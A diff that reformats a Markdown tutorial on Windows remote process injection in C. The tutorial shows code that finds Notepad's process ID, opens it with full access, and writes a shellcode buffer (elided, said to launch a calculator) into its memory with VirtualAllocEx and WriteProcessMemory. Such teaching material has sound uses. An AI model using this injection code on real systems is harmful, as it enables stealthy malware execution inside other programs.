@@ -35,53 +35,51 @@ The success of remote process injection hinges on leveraging specific Win32API f
 
 - Payload definition: The payload variable encapsulates a block of machine code, acting as the payload intended for injection. This payload, in our example, is designed to open a calculator.
 
-```c 
+```c
 unsigned char payload[] = {
   // ... (payload content)
 };
-unsigned int payload_len = sizeof(payload);```
+unsigned int payload_len = sizeof(payload); ```
 
 - Process Identification: (Identify the Process ID of "Notepad.exe" using FindProcessId)
 In this step, the program uses the FindProcessId function to determine the Process ID (PID) of the target process, which, in this example, is "Notepad.exe." The FindProcessId function takes the name of the target process as a parameter and iterates through the list of running processes to find a match. Here, the function uses the Windows API functions CreateToolhelp32Snapshot and Process32First/Process32Next to iterate through the list of processes, comparing each process name with the provided target name ("Notepad.exe"). When a match is found, the corresponding Process ID is returned.
 
 ```c
 int FindProcessId(const char *FprocessName) {
-HANDLE hProcessSnapshot;
-PROCESSENTRY32 pe32;
-DWORD pid = 0;
+  HANDLE hProcessSnapshot;
+  PROCESSENTRY32 pe32;
+  DWORD pid = 0;
 
-hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
-// Error handling
-return 0;
+  if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
+    // Error handling
+    return 0;
+  }
+
+  pe32.dwSize = sizeof(PROCESSENTRY32);
+  if (!Process32First(hProcessSnapshot, &pe32)) {
+    // Error handling
+    CloseHandle(hProcessSnapshot);
+    return 0;
+  }
+
+  while (Process32Next(hProcessSnapshot, &pe32)) {
+    if (_stricmp(FprocessName, pe32.szExeFile) == 0) {
+      pid = pe32.th32ProcessID;
+      break;
+    }
+  }
+
+  CloseHandle(hProcessSnapshot);
+  return pid;
 }
 
-pe32.dwSize = sizeof(PROCESSENTRY32);
-if (!Process32First(hProcessSnapshot, &pe32)) {
-// Error handling
-CloseHandle(hProcessSnapshot);
-return 0;
-}
-
-while (Process32Next(hProcessSnapshot, &pe32)) {
-if (_stricmp(FprocessName, pe32.szExeFile) == 0) {
-pid = pe32.th32ProcessID;
-break;
-}
-}
-
-CloseHandle(hProcessSnapshot);
-return pid;
-}
 ```
-
 - Open the Process:(If the Process ID is obtained, open the process with full access rights using OpenProcess)
 Once the Process ID is identified, the program uses the OpenProcess function to open the target process. This function returns a handle to the specified process, allowing subsequent operations on that process. In this snippet, the OpenProcess function is called with the identified Process ID and the desired access rights (PROCESS_ALL_ACCESS). If the function succeeds, it returns a handle (hProcess) to the opened process, signifying that subsequent operations can be performed on this process.
 
-<prev>
-<code>
-  int main(void) {
+```C int main(void) {
   // ... (main function initialization)
   int main(void) {
     int process_Id = 0;
@@ -100,13 +98,10 @@ Once the Process ID is identified, the program uses the OpenProcess function to 
 
     return 0;
 }
-</code>
-</prev>
-
+```
 - Remote Process Injection: If the process is successfully opened, inject the payload into the target process via the injectPayload function. Following the successful opening of the target process, the program proceeds to inject the payload. This involves allocating memory within the address space of the target process using VirtualAllocEx and writing the payload into that allocated memory with WriteProcessMemory. Here, the injectPayload function is called with the opened process handle (hProcess) and the payload information. The injectPayload function, which was defined earlier, handles the memory allocation and payload injection.
 
-<prev>
-<code>
+```c
 // Function to inject payload into the target process
 int injectPayload(HANDLE ihProcess, unsigned char *iPayload, int iPayload_len) {
     // Allocate memory in the remote process
@@ -142,14 +137,13 @@ int injectPayload(HANDLE ihProcess, unsigned char *iPayload, int iPayload_len) {
 
     return 0;
 }
-</code>
-</prev>
+
+```
 - Main Function: The main function orchestrates the program's execution. It initiates the process identification, opens the target process, and invokes the payload injection.
 
 Here, is the complete sketon of the code
 
-<prev>
-<code>
+```c 
 #include<stdio.h>
 #include<windows.h>
 #include<tlhelp32.h>
@@ -234,6 +228,4 @@ int main (void)
     }
 return 0;
 
-}
-</prev>
-</code>
+}```
